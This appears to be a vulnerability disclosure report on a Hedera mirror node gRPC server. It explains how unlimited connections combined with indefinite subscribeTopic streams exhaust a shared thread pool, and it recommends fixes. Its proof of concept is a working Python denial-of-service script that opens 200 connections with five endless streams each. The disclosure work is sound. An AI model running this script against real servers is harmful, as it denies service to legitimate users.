### Title
Unbounded gRPC Connection Amplification via Shared `applicationTaskExecutor` Thread Pool Exhaustion

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server to use Spring's shared `applicationTaskExecutor` as its RPC dispatch executor and limits concurrent calls to 5 per connection, but imposes no limit on the total number of inbound connections. An unauthenticated external attacker can open an arbitrary number of distinct TCP/HTTP2 connections to port 5600, saturate each with 5 indefinite `subscribeTopic` streaming calls (no `consensusEndTime` required), and drive CPU and memory consumption well above 30% without triggering brute-force detection.

### Finding Description

**Exact code path:**

`GrpcConfiguration.java` lines 28–35:
```java
@Bean
ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
        GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
    final var nettyProperties = grpcProperties.getNetty();
    return serverBuilder -> {
        serverBuilder.executor(applicationTaskExecutor);                                          // shared pool
        serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // per-conn only
    };
}
```

`NettyProperties.java` line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `maxConcurrentCallsPerConnection` is a *per-connection* ceiling, not a global ceiling. No `maxInboundConnections`, `maxConnectionAge`, `maxConnectionIdle`, or IP-based throttle is configured anywhere in the gRPC stack (confirmed by grep: zero matches for `maxConnectionAge`, `maxConnectionIdle`, `maxInboundConnections`, `permitKeepAlive`). The gRPC module has no `ThrottleConfiguration` (unlike the `web3` module which uses Bucket4j). No authentication or authorization is required to reach port 5600.

**Exploit flow:**

1. Attacker opens *N* distinct TCP connections to port 5600 (no credential required).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` RPCs with no `consensusEndTime` and no `limit` field set — per `ConsensusTopicQuery` proto definition (`limit = 0` means "indefinitely").
3. Each call enters `ConsensusController.subscribeTopic()` (line 43), which dispatches via `applicationTaskExecutor` and creates a live `Flux` pipeline backed by `TopicMessageServiceImpl.subscribeTopic()`.
4. Each subscription allocates a `TopicContext` (with `AtomicLong`, `AtomicReference`), a historical `Flux`, a live `Flux`, a safety-check `Flux` on `Schedulers.boundedElastic()`, and — with the default `REDIS` listener type — a Redis pub/sub channel subscription.
5. Spring Boot's default `applicationTaskExecutor` (`ThreadPoolTaskExecutor`) has an effectively unbounded max pool size (`Integer.MAX_VALUE`) and queue capacity. With *N* connections × 5 calls = *5N* concurrent dispatch tasks, the pool grows without bound.
6. Memory grows linearly with *5N* live reactive pipeline states; CPU grows from Redis polling, safety-check timers, and thread scheduling overhead.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` only prevents >5 streams *per connection*; it does nothing to cap total connections or total streams.
- No `maxInboundConnections` is set on `NettyServerBuilder`.
- No gRPC-level rate limiter or IP throttle exists in the grpc module.
- The Grafana/Prometheus alert for `GrpcHighCPU` fires only *after* CPU exceeds 80% for 5 minutes — it is a detection mechanism, not a prevention mechanism.

### Impact Explanation

With a modest number of connections (e.g., 200 connections × 5 streams = 1,000 concurrent indefinite subscriptions), the server sustains 1,000 live reactive pipelines, 1,000 Redis subscriptions, and continuous thread-pool growth. Memory consumption rises proportionally to the number of `TopicContext` objects and Netty HTTP/2 stream state. CPU rises from Redis polling intervals (500 ms default), safety-check `Mono.delay` timers, and thread scheduling. Legitimate subscribers experience degraded throughput or timeouts. The impact is a denial-of-service against the gRPC API without affecting other components.

### Likelihood Explanation

The attack requires only a gRPC client library (freely available) and network access to port 5600. No credentials, API keys, or privileged network position are needed. The attack is repeatable and can be automated with a simple script. The per-connection limit of 5 actually *encourages* opening more connections, making the attack more distributed and harder to block by simple per-IP connection counting. The absence of any connection-age or idle timeout means streams persist until the attacker closes them.

### Recommendation

1. **Set a global connection limit** on `NettyServerBuilder`:
   ```java
   serverBuilder.maxConnectionAge(30, TimeUnit.MINUTES);
   serverBuilder.maxConnectionAgeGrace(5, TimeUnit.MINUTES);
   serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);
   ```
2. **Add `maxInboundConnections`** (available in grpc-java ≥ 1.60) to `NettyProperties` and wire it in `grpcServerConfigurer`.
3. **Introduce a gRPC-level rate limiter** (analogous to `ThrottleConfiguration` in the web3 module) using a `ServerInterceptor` that enforces per-IP or global call-rate limits.
4. **Cap the `applicationTaskExecutor`** pool size and queue capacity via `spring.task.execution.pool.max-size` and `spring.task.execution.pool.queue-capacity` to prevent unbounded thread growth.
5. **Enforce a maximum subscription duration** by requiring a non-zero `consensusEndTime` or imposing a server-side timeout on streaming calls.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor
# proto stubs from protobuf/src/main/proto/...
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 200   # distinct TCP connections
STREAMS_PER_CONN = 5  # saturate maxConcurrentCallsPerConnection

def open_streams(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no consensusEndTime → indefinite stream
        # no limit → indefinite stream
    )
    threads = []
    for _ in range(STREAMS_PER_CONN):
        def consume():
            for _ in stub.subscribeTopic(query):
                pass  # consume silently
        t = threading.Thread(target=consume, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    list(pool.map(open_streams, range(CONNECTIONS)))
# Result: 1000 concurrent indefinite streaming subscriptions
# Monitor server CPU/memory via Prometheus: expect >30% increase

```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
